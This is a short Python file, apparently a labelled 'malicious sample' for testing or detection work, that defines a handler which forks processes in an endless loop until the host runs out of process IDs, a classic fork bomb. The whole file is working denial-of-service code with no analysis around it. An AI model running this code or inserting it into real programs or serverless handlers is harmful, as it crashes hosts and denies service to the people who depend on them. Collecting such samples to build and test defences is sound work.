"""Malicious sample: fork-bomb that exhausts process table."""
import os


def handler(event: dict | None = None) -> dict:
    """Spawn processes until the host runs out of PIDs."""
    while True:
        try:
            os.fork()
        except OSError:
            break
    return {"status": "forked"}


if __name__ == "__main__":
    handler()
